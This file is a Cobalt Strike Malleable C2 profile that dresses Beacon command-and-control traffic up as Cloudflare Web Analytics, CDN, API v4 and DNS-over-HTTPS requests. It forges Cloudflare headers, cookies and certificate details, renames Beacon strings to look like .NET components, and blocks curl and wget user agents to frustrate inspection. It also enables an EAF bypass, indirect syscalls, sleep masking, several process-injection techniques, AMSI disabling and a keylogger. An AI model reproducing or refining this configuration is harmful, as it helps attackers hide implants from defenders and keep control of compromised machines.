# Malleable C2 Profile - Cloudflare CDN/API theme
# CS 4.12+ / Beacon Booster compatible
# Simulates Cloudflare API and CDN traffic patterns

set sample_name "Cloudflare Worker Runtime";
set data_jitter "48";
set host_stage "false";
set tasks_max_size "104857600";
set pipename "dotnet_##_##_############";
set pipename_stager "eventlog_###";
set smb_frame_header "";
set ssh_banner "OpenSSH_9.6p1 Ubuntu-3ubuntu13";

set sleeptime "30000";
set jitter "33";

set ssh_pipename "postex_ssh_####";
set tcp_frame_header "";
set tcp_port "8553";

set headers_remove "";
set steal_token_access_mask "11";
set tasks_proxy_max_size "94371840";
set tasks_dns_proxy_max_size "71680";

dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost ".stage.123456.";
    set dns_ttl "1";

    set beacon         "cdn.bc.";
    set get_A          "cdn.1a.";
    set get_AAAA       "cdn.4a.";
    set get_TXT        "cdn.tx.";
    set put_metadata   "cdn.md.";
    set put_output     "cdn.po.";

    set ns_response "zero";

    set comm_mode "dns-over-https";
    dns-over-https {
        set doh_verb           "POST";
        set doh_useragent      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
        set doh_proxy_server   "";
        set doh_server         "cloudflare-dns.com";
        set doh_accept         "application/dns-message";
        header "Content-Type"  "application/dns-message";
    }
}

http-config {
    set headers "Date, Server, Content-Length, Connection, Content-Type";
    header "Server" "cloudflare";
    header "Connection" "keep-alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
    set allow_useragents "";
}

https-certificate {
    set C "US";
    set CN "*.cloudflareinsights.com";
    set L "San Francisco";
    set OU "Cloudflare Inc";
    set O "Cloudflare Inc";
    set ST "CA";
    set validity "365";
}

http-stager {
    set uri_x86 "/cdn-cgi/trace";
    set uri_x64 "/cdn-cgi/scripts/script.js";

    client {
        parameter "v" "4.12.0";
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "public, max-age=14400";
        header "CF-Cache-Status" "HIT";
        header "CF-Ray" "8a2b3c4d5e6f7890-ARN";
        output {
            prepend "/* cloudflare web analytics */\n(function(){var _=";
            append "})();\n";
            print;
        }
    }
}

set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";

# GET - mimics Cloudflare Web Analytics beacon
http-get {
    set uri "/cdn-cgi/rum";

    client {
        header "Accept" "*/*";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "no-cors";
        header "Sec-Fetch-Dest" "script";
        header "Sec-Ch-Ua" "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"";
        header "Sec-Ch-Ua-Platform" "\"Windows\"";

        metadata {
            mask;
            base64url;
            prepend "__cf_bm=";
            header "Cookie";
        }

        parameter "t" "page_view";
        parameter "spa" "true";
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-store, no-cache, must-revalidate";
        header "CF-Cache-Status" "DYNAMIC";
        header "CF-Ray" "8a2b3c4d5e6f7890-ARN";
        header "Alt-Svc" "h3=\":443\"; ma=86400";

        output {
            mask;
            base64;
            prepend "{\"success\":true,\"result\":{\"data\":\"";
            append "\"},\"errors\":[],\"messages\":[]}\n";
            print;
        }
    }
}

# POST - mimics Cloudflare API v4 endpoint
http-post {
    set uri "/client/v4/zones/events";
    set verb "POST";
    set client_max_post_get_packet "4096";

    client {
        header "Content-Type" "application/json; charset=utf-8";
        header "Accept" "application/json";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "cors";
        header "Sec-Fetch-Dest" "empty";

        output {
            mask;
            base64url;
            uri-append;
        }

        id {
            mask;
            base64url;
            prepend "{\"zone_id\":\"";
            append "\",\"type\":\"performance\"}\n";
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "CF-Cache-Status" "DYNAMIC";
        header "CF-Ray" "8a2b3c4d5e6f7890-ARN";
        header "Alt-Svc" "h3=\":443\"; ma=86400";

        output {
            mask;
            base64;
            prepend "{\"success\":true,\"result\":{\"id\":\"";
            append "\"},\"errors\":[],\"messages\":[]}\n";
            print;
        }
    }
}

http-beacon {
    set library "winhttp";
    set data_required "true";
    set data_required_length "256-512";
}

stage {

    set checksum "0";
    set data_store_size "16";

    set copy_pe_header         "true";
    set eaf_bypass             "true";
    set rdll_loader            "PrependLoader";
    set rdll_use_syscalls      "true";
    set rdll_use_driploading   "true";
    set rdll_dripload_delay    "100";

    # Beacon Booster compatible: no transform-obfuscate, no prepend/append in stage transforms

    transform-x86 {
        strrep "ReflectiveLoader" "WorkerInit";
        strrep "beacon.x64.dll" "clrjit.dll";
        strrep "beacon.dll" "clrjit.dll";
    }

    transform-x64 {
        strrep "ReflectiveLoader" "WorkerInit";
        strrep "beacon.x64.dll" "clrjit.dll";
        strrep "beacon.dll" "clrjit.dll";
    }

    stringw "I am not Beacon";

    set allocator "VirtualAlloc";
    set cleanup "true";
    set magic_pe "PE";
    set obfuscate "true";
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
      All;
    }

    set smartinject "false";
    set stomppe "true";
    set userwx "false";

    set compile_time "07 Nov 2023 09:33:00";
    set entry_point "74928";

}

process-inject {

    set allocator "VirtualAllocEx";
    set use_driploading   "true";
    set dripload_delay    "100";

    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";

    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
    }

    execute {
        ObfSetThreadContext;
        CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        NtQueueApcThread-s;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\RuntimeBroker.exe";
    set spawnto_x64 "%windir%\\sysnative\\RuntimeBroker.exe";

    set obfuscate "true";
    set pipename "dotnet_diag_####, dotnet_diag_###";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
    set cleanup "true";

    transform-x64 {
        strrepex "PortScanner" "Scanner module is complete" "Done";
        strrep "is alive." "is up.";
    }

    transform-x86 {
        strrepex "PortScanner" "Scanner module is complete" "Done";
        strrep "is alive." "is up.";
    }
}
